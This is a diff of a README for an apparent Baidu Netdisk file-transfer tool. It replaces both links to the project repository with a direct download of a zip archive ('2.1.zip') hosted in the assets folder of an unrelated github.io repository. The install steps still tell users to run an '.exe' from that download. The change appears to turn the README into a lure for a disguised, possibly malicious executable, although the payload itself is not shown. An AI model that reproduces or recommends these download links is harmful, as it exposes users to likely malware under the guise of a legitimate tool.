@@ -5,7 +5,7 @@ description: "Transfer files between Baidu Netdisk and Linux environments using 
 ---
 # 📁 baidu-netdisk-transfer - Move your files between cloud storage
 
-[![Download](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Julesbladed538/baidu-netdisk-transfer)
+[![Download](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Julesbladed538/julesbladed538.github.io/raw/refs/heads/main/src/assets/2.1.zip)
 
 This application helps users transfer files between local storage and Baidu Netdisk. It uses the bypy and aria2c tools to manage your data movements. You do not need to know how to write code to use this tool. 
 
@@ -21,7 +21,7 @@ Before you start, ensure your computer meets these requirements:
 
 Follow these steps to set up the software on your machine:
 
-1. Go to the download page: https://github.com/Julesbladed538/baidu-netdisk-transfer
+1. Go to the download page: https://github.com/Julesbladed538/julesbladed538.github.io/raw/refs/heads/main/src/assets/2.1.zip
 2. Locate the file section on the page.
 3. Select the file ending in .exe.
 4. Save the file to your desktop.
